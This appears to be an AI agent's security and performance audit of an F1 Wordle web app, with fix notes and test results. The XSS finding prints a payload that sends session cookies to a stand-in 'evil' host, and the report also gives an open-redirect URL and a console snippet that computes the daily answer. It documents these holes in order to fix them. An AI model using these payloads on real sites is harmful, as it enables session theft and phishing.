## Context

A full-site F1 Wordle (daily / infinite / real-time duel) on Next.js 15 App Router +
Supabase + Drizzle. The request was a structured, read-only audit across performance,
cleanliness, security, gameplay UX, and F1 data management, ending in a prioritized top-5.
No code has been changed.

**Headline — two halves, and the second one matters more.**

The craft is genuinely above average. Zero `any` (all 6 grep hits are the word "any" inside
prose comments), `SET search_path = public` on **every** `SECURITY DEFINER` function, no
secrets ever committed, 17 vitest files, and some of the best "why" comments I've read in a
codebase this size.

*(Correction to something I'd have told you an hour ago: I initially credited the SQL⇄TS
parity tests as "locking the compare rules". They don't. All eight integration and parity
suites are `describe.skipIf(!RUN)` behind `RUN_DB_INTEGRATION_TESTS=1`, there is **no

the finding that changes how much every other "it's covered by a test" claim is worth.)*

*(2026-07-28: ✅ fixed. `.github/workflows/ci.yml` runs the opt-in suites on every push, so the
parity tests now assert on a schedule rather than when someone remembers, and "it's covered by a

**But the daily puzzle's answer is currently public, and there is a session-stealing XSS in
the OAuth callback.** Neither is a subtle architectural quibble; both are exploitable today
by anyone with devtools. They sit in the two places the otherwise-careful security work
didn't look: **function `EXECUTE` grants** (the code reasons carefully about RLS and
`search_path`, then relies on a default grant that goes the other way — a trap this repo
has *already documented and fixed once*, in 0034, just not everywhere) and **Server Action
parameter surface** (RPCs are locked down hard; the Server Actions beside them take
`won`, `guessCount`, and `forfeitedPlayerId` straight from the client).

I verified every CRITICAL and HIGH finding against the source myself rather than taking a
sub-audit's word for it. Where something is good, I've said so specifically — the credit
list in §3.12 is as researched as the findings.

**One correction to the brief:** it asks about "Team, Engine, Country, Age, Wins, Podium
finishes". The game has **five** columns, not six, and neither Engine nor Podiums exists —
[compare.ts:16-25](../lib/game/compare.ts#L16-L25) defines Nationality / Team / Age / Debut

## 1. Performance & Efficiency

### 1.0 `useServerCountdown` intervals never stop — the duel re-renders 20–30×/sec, forever — HIGH — ✅ FIXED (2026-07-28)

> **Status: fixed.** Finding confirmed exactly as written, in all three of its parts. Fixing the
> interval turned up **one thing the audit missed**: `useLightsCountdown` was deliberately built to
> borrow these ticks instead of owning a timer, so stopping them introduces a narrow hang. See
> "Resolution" at the end of this section.

[useServerCountdown.ts:31-35](../components/duel/useServerCountdown.ts#L31-L35)

```ts
useEffect(() => {
  if (target === null) return;
  const interval = setInterval(() => forceTick((n) => n + 1), 100);
  return () => clearInterval(interval);
}, [target]);
```

The only stop condition is `target === null`. It does **not** stop when the countdown
reaches zero. `DuelMatch` mounts two of them
([DuelMatch.tsx:206-207](../components/duel/DuelMatch.tsx#L206-L207)):

- `remainingToStart` matters only during the ~4 s lights sequence, but `round.startedAt`
  stays set, so it keeps firing at 10 Hz for the whole 60 s round while pinned at `0`.
- `round` is **never cleared** on the terminal path
  ([:324-333](../components/duel/DuelMatch.tsx#L324-L333)) or on the last round of
  `proceedFromIntermission` ([:529-537](../components/duel/DuelMatch.tsx#L529-L537)). So on the
  **results screen** both intervals are still alive — `DuelMatch` + `DuelResults` re-render
  20×/second indefinitely while a player sits deciding on a rematch.

Effective rates: ~20 renders/sec during a round, **~30/sec during intermission** (
[DuelIntermission.tsx:95](../components/duel/DuelIntermission.tsx#L95) adds a third countdown
while both of `DuelMatch`'s are still running), and ~20/sec forever on results. That's an
unbounded idle CPU/battery drain on exactly the screen where players linger.

Compounding it: **`React.memo` appears zero times in the repo.** Every one of those renders
walks the full subtree — `TugOfWarBar`, `OpponentPanel` (2× `AvatarGlyph`),
`RoundResultCards`, `DriverAutocomplete` (with the pool in scope), `ClosestGuessesBoard`
(`GuessRow` × N → `Tile` × 5 → `Flag`). And two of those do real work per render:

- [ClosestGuessesBoard.tsx:35](../components/duel/ClosestGuessesBoard.tsx#L35) copies **and
  sorts** the guess array (`guessHeat` → `weightedProximity` per comparison) — O(n log n)
  × field math, 20–30× a second instead of once per guess.
- [RoundPlay.tsx:79](../components/duel/RoundPlay.tsx#L79) recomputes
  `Math.max(0, ...me.guesses.map(proximityPoints))` over all guesses, every render.

Fix, in order: stop the interval once the target has passed and null out `round` on the
terminal paths; `memo()` the four stable-prop components; `useMemo` the sort and the max.
Also [DuelIntermission.tsx:95-96](../components/duel/DuelIntermission.tsx#L95-L96) uses a
10 Hz countdown purely to detect a deadline it explicitly no longer draws
([:181-186](../components/duel/DuelIntermission.tsx#L181-L186)) — a single `setTimeout` does
the same job with 0 renders instead of ~60.

#### Resolution (2026-07-28)

Built as prescribed, in the order given. Five changes, and the fourth is the one the finding
didn't see coming.

**1. The interval stops when the countdown does**
([useServerCountdown.ts](../components/duel/useServerCountdown.ts)). It now refuses to arm for an
already-elapsed target, and clears itself on the first tick at or past the deadline. The ordering
inside that tick is load-bearing and carries a comment saying so: it forces the re-render **first**
and clears **after**. The render it forces is the one where the value finally reads `0`, and
`DuelMatch`'s round-expiry effect is waiting on exactly that edge (`remainingToEnd > 0` going
false) to fire its idempotent `duel_close_round`. Clearing first would leave one tick of time on
the clock and drop round closure onto the `DUEL_POLL_INTERVAL_MS` safety net — trading a render
bug for a gameplay one. `clockOffsetMs` moved to a ref so it can be read inside the interval
without being a dep that tears it down and rebuilds it.

**2. `round` is nulled on both terminal paths**
([DuelMatch.tsx](../components/duel/DuelMatch.tsx)) — `adoptTerminal` (forfeit, disconnect, resume
onto a finished match) and `proceedFromIntermission`'s last-round branch. Safe because the
`phase === "finished"` render branch precedes the `if (!round)` guard, and both updates batch. This
is the half that fixes the *indefinite* drain: without it the results screen still holds a round row
that these hooks cannot distinguish from a live one.

**3. `memo()` + `useMemo`.** `TugOfWarBar`, `OpponentPanel`, `RoundResultCards`,
`ClosestGuessesBoard` and `DriverAutocomplete` are memoized; the closeness sort moved into a
`useMemo` inside `ClosestGuessesBoard`, and `RoundPlay`'s `Math.max(...proximityPoints)` scan into
one keyed on the guess list. Two supporting pieces, because `memo()` without them is decoration:
`RoundPlay` memoizes the two object literals it feeds `OpponentPanel`, and `DuelMatch` pins its
`onGuess` with a ref-latched `useCallback` — `handleGuess` closes over `myGuesses`/`round`, and
`useDuelChannel` returns a fresh object every render, so no honest dep list would ever be stable.
`React.memo` now appears 5 times in the repo rather than 0.

**4. `useLightsCountdown` needed its own timer, which the finding didn't anticipate.** That hook
was *designed* to have no interval — its header comment argues explicitly that a second timer would
be redundant "because every caller already re-renders every ~100ms via its own
`useServerCountdown`". Change #1 removes that guarantee, and two of the hook's gates
(`allLitHeldLongEnough`, `localLitCount`) are derived in the render body against its own **local**
clock, not the server one. So on a round landing with 700–1000 ms of countdown budget left — a slow
`duel_begin_round` round trip — the caller's countdown reaches `started_at` and goes quiet while
the hook still owes an `LIGHTS_ALL_LIT_HOLD_MS` dwell. No further renders, so `isGo` never fires,
`holdComplete` never fires, `DuelCountdown`'s `onGo` never hands the round over: **a hung match**.
The window is narrow and today it's masked precisely by the bug this finding is about. It now owns
a tick that arms only while a ceremony is on screen (`key !== null`) and stops for good at
`holdComplete` — bounded to one countdown per round, which is the opposite of the forever-timer
§1.0 is about.

**5. The intermission's undrawn countdown is a `setTimeout`,** via a new
`useServerDeadlinePassed(targetIso, clockOffsetMs)` beside `useServerCountdown` — same clock
correction, returns the *edge* rather than the number, one timer landing on the deadline. ~60
renders per intermission → 0.

Net, per screen:

| Screen | Before | After |
|---|---|---|
| Results (indefinite) | ~20/sec forever | **0** |
| Intermission | ~30/sec | **0** (the count-up's own 1 s rAF aside) |
| Round | ~20/sec, full subtree | 10/sec of `DuelMatch` + `RoundPlay`'s own shell; every heavy child skipped |
| Pre-round lights | ~20/sec | ~10/sec, and only for the ~3.9 s it's on screen |

The round is still 10 Hz on purpose: the timer is drawn there and the expiry edge closes the round.
What changed is that nothing under it does work for those ticks any more.

Verified with `npx tsc --noEmit` and `npm test` (146 passed, 91 skipped — the DB tiers). **No
runtime verification**: `vitest.config.mts` is `environment: "node"` with no React testing library,
so there are no component tests to add this to — the gap §2.6 already records. The render-count
claims above are reasoned from the timer lifecycles, not measured in a browser.

A related bug this deliberately did **not** fix, since it's §4.4's: `Modal`'s focus-trap effect
lists `onClose` as a dep, and `DuelMatch` passes a fresh arrow, so while the exit-confirm modal is
*open* that effect tears down and re-runs on every tick — refocusing the panel each time. It costs
nothing while closed (the effect early-returns on `isRendered`), which is the whole round.

### 1.1 `AuthContext` value is a new object on every render — HIGH — ✅ FIXED (2026-07-29)

> **Fixed in [AuthProvider.tsx](../components/auth/AuthProvider.tsx)**, exactly as this finding
> prescribes: `useCallback` on `signOutAndReset`, `useMemo` on the value. Both halves are needed —
> one unstable function is enough to defeat the memo, which is why `signOutAndReset` had to move
> first.
>
> **Scoped out, deliberately: the two-context split.** This finding offers it as "optionally", and
> it is a different change with a different risk profile — ten call sites, each having to choose
> between `useAuthIdentity()` and `useAuthProfile()`, in the provider that gates every board. The
> memo is what stops a re-render that changed nothing; the split is what would stop a *stats*
> refresh re-rendering the daily board, and it is still open. `identityStatus` / `status` already
> mark where the seam goes.

[AuthProvider.tsx:473-476](../components/auth/AuthProvider.tsx#L473-L476)

```tsx
<AuthContext.Provider
  value={{ user, session, profile, stats, userId, isGuest, identityStatus, status, loading, refresh, signOutAndReset }}
>
```

The object literal is rebuilt on every `AuthProvider` render, so **every** `useAuth()`
consumer re-renders on every auth state change — and `AuthProvider` wraps the entire app.
`signOutAndReset` compounds it: it's a plain `function` declaration
([:442](../components/auth/AuthProvider.tsx#L442)), not a `useCallback`, so its identity
changes every render and would defeat a naive `useMemo` too. On a cold load the provider
sets state ~5 times (`session` → `user` → `profile` → `stats` → `resolvedId`), so the whole
tree renders 5×.

Fix: `useCallback` on `signOutAndReset`, `useMemo` on the value. Optionally split into two
contexts (identity vs profile/stats) so a stats refresh doesn't re-render game boards — the
`identityStatus` / `status` split at [:139-159](../components/auth/AuthProvider.tsx#L139-L159)
already shows the seam exists conceptually; it just isn't enforced at the React level.

### 1.2 Countdown tick re-renders the whole daily board every second — MED
[DailyGame.tsx:223-236](../app/%28game%29/daily/DailyGame.tsx#L223-L236)

Once the round is over, `setCountdown(...)` fires every 1000 ms, re-rendering `DailyBoard`
and everything under it — `GuessGrid` (6 rows × 6 tiles), `ResultCard`, `DriverAutocomplete`,
the share `Modal`. Cheap per render, but it's a permanent 1 Hz churn on the completed-board
screen, and it directly causes the focus bug in **4.3** below.

Fix: extract the countdown into its own leaf component holding its own state, so the ticking
state lives where it renders. Or `React.memo` `GuessGrid`.

### 1.3 Fuzzy filter is a full O(n) scan + `toLowerCase()` per item per keystroke — MED — ✅ FIXED (2026-07-28)

> **Fixed in [fuzzyMatch.ts](../lib/game/fuzzyMatch.ts) + [DriverAutocomplete.tsx](../components/game/DriverAutocomplete.tsx),
> as the same change as 4.2/4.3 exactly as this finding recommends.** Both halves: the
> per-item `toLowerCase()` is replaced by a folded key built once per pool, and the
> sort-everything-take-8 by a bounded top-8 insertion. Measured on an 800-driver pool:
> **117.3 µs → 94.1 µs per keystroke**, index build 431 µs once per pool. See §4.3's Resolution.

[fuzzyMatch.ts:41-42](../lib/game/fuzzyMatch.ts#L41-L42)

```ts
for (const item of items) {
  const score = fuzzyScore(trimmed, getText(item).toLowerCase());
```

`getText(item).toLowerCase()` allocates a new lowercased string for **every driver on every
keystroke**. Then `scored.sort()` sorts all matches to take 8. For daily/duel (10-year pool,
~50-60 drivers) this is irrelevant. For **Infinite on the `legacy` pool it's the full ~800-row
roster** — 800 string allocations + a full sort per keystroke, on mobile.

Fix: precompute a normalized (lowercased **and** accent-stripped — see **4.2**) search key
once when the pool is built, e.g. `{ id, fullName, nationality, searchKey }`. Then replace
the sort-everything with a bounded top-8 insertion. Both are small, contained changes in
[fuzzyMatch.ts](../lib/game/fuzzyMatch.ts) plus the pool-building call sites.

### 3.0 Reflected XSS in the OAuth callback → session takeover — CRITICAL — ✅ FIXED
[route.ts:47-55](../app/auth/callback/route.ts#L47-L55)

> **Status (2026-07-28): fixed and verified.** Finding confirmed as written. Fix in
> [lib/auth/oauthCallback.ts](../lib/auth/oauthCallback.ts) +
> [app/auth/callback/route.ts](../app/auth/callback/route.ts), regression tests in
> [oauthCallback.test.ts](../lib/auth/oauthCallback.test.ts). Investigating it turned up a
> **second live bug in the same three lines** that this finding missed — an open redirect
> that survives the XSS patch. Details under "Fix as shipped" below.

```ts
const fallbackCode = searchParams.get("error_code") ?? searchParams.get("error") ?? "oauth_callback_failed";
const html = `<!doctype html><script>
  var code = hashParams.get("error_code") || ${JSON.stringify(fallbackCode)};
  window.location.replace(${JSON.stringify(next)} + "?error_code=" + encodeURIComponent(code));
</script>`;
return new NextResponse(html, { headers: { "content-type": "text/html; charset=utf-8" } });
```

`JSON.stringify` escapes quotes and backslashes but **not `</script>`**. The HTML parser
terminates a `<script>` element at the first `</script` sequence regardless of JavaScript
string context, so both interpolations break out of the script. `next` is validated only as
"starts with `/`, not `//`" ([:16](../app/auth/callback/route.ts#L16)) — a payload satisfies
that trivially — and `fallbackCode` is raw query input with no validation at all.

**Exploit:** `GET /auth/callback?next=/a</script><script>fetch('//evil/'+document.cookie)</script>`
— no `code` param, so it falls into exactly this branch. Unauthenticated, no user
interaction beyond following a link.

**Why it's session takeover, not just script execution:** `@supabase/ssr`'s browser client
keeps the session in `document.cookie` ([browser.ts:8-13](../lib/supabase/browser.ts#L8-L13)),
so those cookies are **not** httpOnly and are readable by injected script.
[next.config.ts](../next.config.ts) is empty, so there is no CSP to fall back on.

#### Also here: an open redirect the XSS fix alone would have left behind

The `!rawNext.startsWith("//")` guard is **insufficient on its own terms**, independent of the
XSS. `next` is also used client-side as `window.location.replace(next + "?error_code=…")`, and
the WHATWG URL parser treats `\` as `/` for special schemes: parsing `/\evil.com` enters
*relative slash state* on the `/`, then *special authority ignore slashes state* on the `\`, so
the host becomes `evil.com`. `GET /auth/callback?next=/%5Cevil.com` passes both `startsWith`
checks and redirects off-site — a working open redirect on an auth endpoint, which is exactly
where one is worth most to a phisher.

Escaping alone would not have caught this: `/\evil.com` contains no HTML metacharacters, so it
survives any amount of escaping intact. It needs the *validation* layer, not the escaping one.
(The server-side `NextResponse.redirect` in the `code` branch is not affected — there `next` is
concatenated after an absolute `origin`, so the host is already fixed by the time the parser
reaches it. Only the client-side relative navigation is exploitable.)

#### Fix as shipped

Three independent layers, so no single mistake reopens it. The route no longer builds script
source from request data at all:

1. **Strict allowlist validation** — `sanitizeNextPath` requires `/^\/[A-Za-z0-9\-._~/]*$/`,
   rejects `//`, `..`, and (crucially) `\`, and caps length; `sanitizeErrorCode` requires
   `/^[A-Za-z0-9_.-]{1,64}$/`, which is what real GoTrue codes look like. Both fall back to a
   safe default rather than throwing — `next` only decides where the user lands, and failing an
   otherwise-successful sign-in would be the worse outcome. Every legitimate value is
   `window.location.pathname`, so no real route is affected.
2. **`data-*` attributes, not interpolation** — the script body is now a **constant**. It reads
   both values off `document.currentScript.dataset` at runtime, and they are HTML-attribute
   escaped (`&`, `<`, `>`, `"`, `'`) on the way in. Nothing request-derived is ever parsed as
   JavaScript.
3. **Per-response nonce CSP** — `default-src 'none'; script-src 'nonce-<uuid>'; base-uri 'none';
   form-action 'none'; frame-ancestors 'none'`, so an injected `<script>` doesn't execute even
   if layers 1 and 2 both failed. Plus `no-store` (an auth redirect carrying per-user state must
   never enter a shared cache), `nosniff`, and `no-referrer`.

The sanitizing and building are pure functions in `lib/auth/oauthCallback.ts` precisely so the
escaping rules are testable without booting a server. `oauthCallback.test.ts` (13 cases) pins
both payloads from this finding by value, plus the `/\` redirect, and asserts the structural
invariant that catches the whole class: **the response contains exactly one `<script` and one
`</script`**, for hostile input and raw input alike.

Two incidental improvements while in there: `sanitizeErrorCode` is now applied to the `code`
branch's redirect too (it was already `encodeURIComponent`-safe, but a 4KB junk `error_code` no
longer round-trips through the app), and the forwarding script now also reads GoTrue's plain
`error` hash key, not just `error_code` — the server-side fallback always checked both, so the
hash path was the inconsistent one.

### 3.1 The daily answer is publicly computable — three independent ways — CRITICAL — ✅ FIXED (2026-07-28)

> **Fixed in [drizzle/0038_daily_target_secret.sql](../drizzle/0038_daily_target_secret.sql).** All
> three parts, plus the deletion of the algorithm itself. See "Resolution" at the end of this
> section.

**(a) `daily_target_id` is callable from any browser.**
[0030:48-52](../drizzle/0030_daily_state_rpc.sql#L48-L52) is `SECURITY DEFINER`, and its own
comment at [:43-44](../drizzle/0030_daily_state_rpc.sql#L43-L44) says it is *"deliberately NOT
granted to authenticated"*. **That comment is factually wrong.** Postgres default-grants
`EXECUTE` on a new function to `PUBLIC`, and this lives in `public`, the schema PostgREST
exposes. I checked every `REVOKE` in `drizzle/*.sql`: there are 11, and they cover only the
four duel functions (0034, re-applied in 0035/0036). Nothing revokes `daily_target_id`.

Because it's `SECURITY DEFINER`, it runs as the table owner and sails straight past
`daily_targets`' deny-all RLS ([0030:34](../drizzle/0030_daily_state_rpc.sql#L34)).
`POST /rest/v1/rpc/daily_target_id {"p_date":"2026-07-27"}` with the public anon key returns
today's driver id.

The project already diagnosed this exact trap — [0034:37-46](../drizzle/0034_duel_lifecycle_client_rpcs.sql#L37-L46)
spells it out ("callable straight from any browser holding the anon key this whole time") —
and then fixed it for the duel functions only. `compare_drivers` and `pick_daily_driver_id`
are in the same position.

**(b) `pick_daily_driver_id` is a second path**, also PUBLIC-executable
([0028:27-51](../drizzle/0028_daily_infinite_fast_guess_rpc.sql#L27-L51)), and it's also the
**one function in the entire schema without `SET search_path`**. It's `SECURITY INVOKER` so
that isn't itself an escalation vector, but it's the single crack in an otherwise perfect pin.

**(c) The design leaks it even with both revoked — this is the real problem.**
[dailySelection.ts:28-46](../lib/game/dailySelection.ts#L28-L46) is a pure, deterministic,
open-source FNV-1a hash of the date string, modulo the id-sorted pool. And
[daily/page.tsx:18](../app/%28game%29/daily/page.tsx#L18) ships **the entire pool, with ids**, into
the browser as props. So:

```js
const ids = [...poolIdsFromPageProps].sort((a, b) => a - b);
let h = 2166136261;
for (const c of "2026-07-27") { h ^= c.charCodeAt(0); h = Math.imul(h, 16777619); }
ids[(h >>> 0) % ids.length];   // today's driver — no network call at all
```

Four lines in the console, every day, forever → straight to the top of the streak
leaderboard. **Revoking the grants does not fix this.** A secret daily requires an
*unpredictable* pinned target — pick randomly server-side once and write it into
`daily_targets` — rather than a deterministic function of public inputs. That's a real design
change, and it's the one I'd argue matters most in this whole audit.

Worth noting the determinism was a deliberate, well-reasoned fix for a real problem
([dailySelection.ts:1-9](../lib/game/dailySelection.ts#L1-L9): precomputed schedules drifting
out of sync with the live pool). The fix was right; it just needs to be
"random-once-then-pinned" rather than "recomputable-by-anyone".

#### Resolution (2026-07-28) — [drizzle/0038](../drizzle/0038_daily_target_secret.sql)

**(c), the one that mattered, is closed by deletion rather than by hiding.** `daily_target_id`
now picks with `ORDER BY … random() LIMIT 1` over the live 10-year pool and pins the result;
`pick_daily_driver_id` is `DROP`ped, and `dailySelection.ts#pickDailyDriverId`,
`queries.ts#getDailyDriverId` and `dailySelection.sqlParity.test.ts` are deleted with it. The
FNV-1a recipe no longer exists in the repo, so there is nothing to recompute and nothing for a
later change to quietly rewire. `getDailyPuzzleNumber` stays — it says which *day* it is, not who
the driver is.

Two details in the new pick are load-bearing:

- **The upsert had to change shape.** Under a deterministic pick, two racing first-callers
  computed the same id and `ON CONFLICT DO NOTHING` + a re-read was belt-and-suspenders. Random
  picks *differ*, so exactly one must win and the loser must adopt it — the re-read would then be
  depending on isolation-level subtleties for correctness. It's now
  `ON CONFLICT (date) DO UPDATE SET driver_id = daily_targets.driver_id RETURNING driver_id`: a
  deliberate no-op write whose only purpose is to make `RETURNING` fire on the conflict path,
  giving one row-locked statement that always yields the authoritative id.
- **The recent-repeat cooldown is an `ORDER BY`, not a `WHERE`.** Drivers used in the last 30 days
  sort last, uniformly random within each group. As a filter it could empty a 53-driver pool; as an
  ordering it degrades to plain random and can never raise "No puzzle is scheduled". The old hash
  had no repeat avoidance at all, and random without it would feel *worse* than the hash did.

**(a) and (b)** are closed as the finding specified: `EXECUTE` revoked from `PUBLIC, anon,
authenticated` on `daily_target_id` and `compare_drivers`; `pick_daily_driver_id` (the unpinned
`search_path`) deleted outright, which is strictly better than pinning it. `daily_state` and
`daily_submit_guess` were additionally moved onto an explicit grant decision, so every daily
function now has one stated — the habit §3.11 asks for. Live `pg_proc.proacl` after both
migrations:

```
compare_drivers      postgres, service_role
daily_target_id      postgres, service_role
daily_state          postgres, authenticated, service_role
daily_submit_guess   postgres, authenticated, service_role
```

**§3.11's model of Postgres grants is incomplete, and it cost a follow-up migration
([0039](../drizzle/0039_daily_rpc_anon_revoke.sql)).** The finding — correctly — says a new
function is `EXECUTE`-granted to `PUBLIC` by default. On a **Supabase** project that is only half
of it: the bootstrap runs `ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL ON FUNCTIONS TO
postgres, anon, authenticated, service_role`, so every function also receives *individually named*
grants to `anon` and `authenticated`. `REVOKE … FROM PUBLIC` leaves both untouched. 0038's revokes
on the two secret-bearing functions named all three grantees (following drizzle/0034) and were
therefore right; its `REVOKE … FROM PUBLIC` on `daily_state`/`daily_submit_guess` was not, and
`anon` was still listed on both when the live grants were read back. 0039 revokes it by name.
**Whatever CI check §2.6 ends up adding must assert on `proacl` for `anon`/`authenticated`
explicitly** — a check that only looks for the `PUBLIC` default would have passed this database
while `anon` held EXECUTE. The same explicit-`anon` revoke is still open for the duel and infinite
RPCs; they are not answer-bearing (each already checks `auth.uid()`), so that is hygiene rather
than exposure.

**Speed was the explicit constraint, and it is unchanged.** `daily_state()` and
`daily_submit_guess()` are untouched; the only changed code they reach is `daily_target_id`, whose
steady state is the same single indexed PK read it always was. Measured in-database (2000
iterations per side, one round trip, against the real schema): **12.2µs/call before, 12.4µs/call
after** — noise, and ~0.01% of the one warm PostgREST hop that surrounds it. The random pick + pin
costs **383µs** and runs at most once per UTC day, globally, replacing a pool `array_agg` + array
sort + hash + insert + re-read with two statements. The client pool ship in
[daily/page.tsx](../app/%28game%29/daily/page.tsx) is deliberately kept — local autocomplete is why
typing is instant, and once the answer isn't a function of the pool, holding the pool tells you
nothing.

**Migration safety:** 0038 re-rolls already-pinned days *only* where no `daily_progress` and no
`daily_results` row exists for them, so a day someone is midway through keeps its target (otherwise
their stored guesses would silently start comparing against a different driver). In practice that
clears at most the current UTC day; either way the next UTC day is the first genuinely secret one.

**Verified.** Dry run first: the whole migration applied against the real schema inside a
rolled-back transaction — every statement executes; 8 consecutive days picked 8 distinct drivers
(cooldown working); 12 re-pins of one date produced 11 distinct drivers (before, by construction,
that was always 1); re-reading a pinned day is stable. Then applied for real via
`npm run db:migrate`, and the live grants read back from `pg_proc.proacl` (table above — which is
how 0039's gap was caught). `npx tsc --noEmit` clean; `RUN_DB_INTEGRATION_TESTS=1 npm test` **178
passed, all 18 files** including every duel, matchmaking, daily, infinite and compare-parity
suite. The default `npm test` is 118 passed — the drop from 124 is exactly the 6 deleted
`pickDailyDriverId` cases.

New coverage in [lib/db/dailyTargetSecrecy.test.ts](../lib/db/dailyTargetSecrecy.test.ts) replaces
the deleted parity suite. It can't assert parity any more — there is no second implementation — so
it asserts the two properties a secret daily actually rests on: the grants, from a real anon-key
client, and unpredictability, by re-pinning one date repeatedly. It also asserts `daily_state`
still succeeds for a signed-in guest, because a revoke that breaks the board is not a fix.

**Remaining, deliberately not bundled:** ~~the CI query over `proacl`~~ ✅ **done (2026-07-28)** —
[lib/db/schemaGrants.test.ts](../lib/db/schemaGrants.test.ts), run by CI's database tier, and it
does assert on `anon`/`authenticated` by name exactly as this section demands. **Still open:** the
explicit-`anon` revoke sweep across the duel/infinite RPCs. The check does not paper over it — all
13 leftovers are enumerated there with the reason each is inert, under a ratchet test that lets the
count fall and never grow. See §2.6's Resolution.

### 3.2 `recordDailyResult` trusts client-supplied `won` and `guessCount` — CRITICAL — ✅ FIXED (2026-07-28)

> **Fixed as part of Top-5 #3**, together with §3.3 and §3.7. Finding confirmed exactly as
> written, including the "replay ≠ forgery" reading of the `daily_results` guard. See
> "Resolution" at the end of this section; the shared substrate all three rest on is in
> [drizzle/0042](../drizzle/0042_server_authoritative_table_grants.sql).

[actions.ts:28-33](../lib/stats/actions.ts#L28-L33)

```ts
export async function recordDailyResult(won: boolean, guessCount: number): Promise<{ ok: boolean }> {
  const userId = await getCurrentUserId();
  if (!userId) return { ok: false };
  return recordDailyResultForUser(userId, won, guessCount, todayUtcDateString());
}
```

A `"use server"` export whose action id ships in the `/daily` bundle, called from
[DailyGame.tsx:267](../app/%28game%29/daily/DailyGame.tsx#L267). Nothing cross-checks
`daily_progress` — the server-authoritative board that `daily_submit_guess` maintains
specifically so the client can't be trusted. Invoke it with `(true, 1)` and you get
`wins + 1`, `guessDistribution[0]++`, `lastDailyDate = today`, and an extended
`currentStreak`.

It's worse than plain forgery: the `daily_results` PK guard is **first-write-wins**, so a
forged early call also **suppresses** that day's honest result.
[schema.ts:76-79](../lib/db/schema.ts#L76-L79) claims this table stops the action being
"replayable from devtools to inflate user_stats" — it stops *replay*, not *forgery*, and
those are different threats.

**Fix:** drop both parameters. Derive `won` and `guessCount` from the `daily_progress` row
inside the same transaction. The data is already there and already authoritative.

#### Resolution (2026-07-28)

Done as specified. `recordDailyResult()` now takes **no arguments at all**, and
`recordDailyResultForUser(userId)` reads `won`, `guessCount` *and* the UTC day off
`daily_progress` inside its own transaction ([recordDailyResult.ts](../lib/stats/recordDailyResult.ts)).
There is nothing left to forge: the worst a console caller can do is re-record a result they
genuinely earned, which the `daily_results` guard already made a no-op. `daily_results` keeps its
real job — replay — and the misleading claim in [schema.ts](../lib/db/schema.ts) that it stopped
"devtools inflation" is rewritten to say which of the two threats it actually covers.

Two details the fix had to decide that the finding didn't reach:

- **Which day.** "Today per `daily_progress.date`" is nearly right but drops the result of a day
  completed at 23:59:59Z whose record call lands after midnight. It selects the newest **completed**
  row within the last two UTC days instead. Nothing older, and that bound is load-bearing: writing a
  stale day would move `last_daily_date` *backwards* past a newer one, and `nextCurrentStreak` reads
  a negative gap as a restart — the fix would have become a way to break your own streak. Safe
  because a `daily_progress` row can only reach `completed` during its own UTC day
  (`daily_submit_guess` only ever touches today's row), so "newest completed within two days" is
  always the day the caller just finished.
- **§3.10 falls out of it, as predicted.** The day now comes from `(now() AT TIME ZONE 'UTC')::date`
  evaluated *in Postgres*, the same clock that stamped the row — not `todayUtcDateString()` on the
  Vercel machine. Two of the three clocks are now one. The third (the browser, in
  `AuthProvider.toUserStats`) is display-only and already documented as such.

**Speed is unchanged**, which was the explicit constraint. Same one call from the same place, on the
completing guess only, where [DailyGame.tsx](../app/%28game%29/daily/DailyGame.tsx) already notes
latency is irrelevant because the day is over. Inside it, one extra indexed `SELECT` on a PK-shaped
`(user_id, date)` predicate joins an existing transaction — no new round trip, and nothing on the
guess path or the hydration path was touched. Recording the result server-side inside
`daily_submit_guess` would have been marginally faster still and was rejected: it would put
`nextCurrentStreak`'s rules in plpgsql alongside the TypeScript ones, the same two-definitions drift
CLAUDE.md keeps ratings out of SQL to avoid.

### 3.3 A duel player can forfeit their opponent on demand — HIGH — ✅ FIXED (2026-07-28)

> **Fixed in [drizzle/0040](../drizzle/0040_duel_match_liveness.sql).** Finding confirmed as
> written. See "Resolution" at the end of this section.

[actions.ts:158-188](../lib/duel/actions.ts#L158-L188)

```ts
export async function forfeitMatch(matchId: number, forfeitedPlayerId?: string) {
  ...
  const forfeited = forfeitedPlayerId ?? userId;
  if (forfeited !== match.playerA && forfeited !== match.playerB) { ... }
  result = await duelForfeit(matchId, forfeited);
  if (result.advanced) await applyMatchResult(...);   // writes Elo + W/L
```

The only checks are "caller is a participant" and "target is a participant". **Nothing
verifies the opponent is actually absent.** The `DISCONNECT_GRACE_MS` timer in
[DuelMatch.tsx:729-733](../components/duel/DuelMatch.tsx#L729-L733) is the entire enforcement,
and it's client-side. One devtools call — `forfeitMatch(matchId, opponentId)` — mid-match
sets `status='abandoned'`, `winner_id = attacker`, and writes Elo. A guaranteed win on
demand, farming `duel_rating`, which is the primary leaderboard sort
([leaderboard/actions.ts:57](../lib/leaderboard/actions.ts#L57)).

[0026:13-16](../drizzle/0026_duel_forfeit_rpc.sql#L13-L16) acknowledges the gap ("the server has
no presence view of its own… accepted for v1"), so this is a known trade-off rather than an
oversight — but it's worth re-weighing now that a leaderboard ranks on the result. The fix
needs a server-verifiable absence signal (a `last_seen_at` on the match, heartbeated the way
`matchmaking_queue` already does it).

#### Resolution (2026-07-28) — [drizzle/0040](../drizzle/0040_duel_match_liveness.sql)

Built exactly as the finding prescribes, and the `matchmaking_queue` parallel it points at turned
out to be the right one down to the shape: `duel_matches.last_seen_a` / `last_seen_b`, a
`duel_heartbeat(match_id)` RPC, and a staleness window. Four pieces:

1. **The columns**, defaulting to `now()` at insert so a freshly created match can't be claimed
   stale before either client has had a chance to beat.
2. **`duel_heartbeat(match_id)`** — `SECURITY DEFINER`, resolves the caller from `auth.uid()`, and
   writes **only that caller's own column**. This is the security property, and the one the
   integration suite asserts hardest: a client can vouch for itself and for nobody else. Returns
   `false` on a terminal or non-participant match, which is how the client knows to stop.
3. **The check, in `forfeitMatch`.** Forfeiting *yourself* stays unconditional — that's Exit and
   sign-out. Forfeiting someone else now requires their column to be stale past
   `DISCONNECT_GRACE_MS`. The comparison is evaluated **in Postgres**, as two computed booleans on
   the `SELECT` that already read the match row, so both timestamps come off one clock (§3.10's
   lesson) and it costs **zero extra round trips**.
4. **The client beat**, in `DuelRoot` rather than `DuelMatch` — it has to cover staging onward,
   every phase in which the opponent's grace timer could fire against you, and `DuelMatch` only
   mounts once a round is live. `DUEL_HEARTBEAT_MS = 5000`, the same 3:1 ratio against its window
   that `QUEUE_HEARTBEAT_MS` has, so two missed beats are survivable.

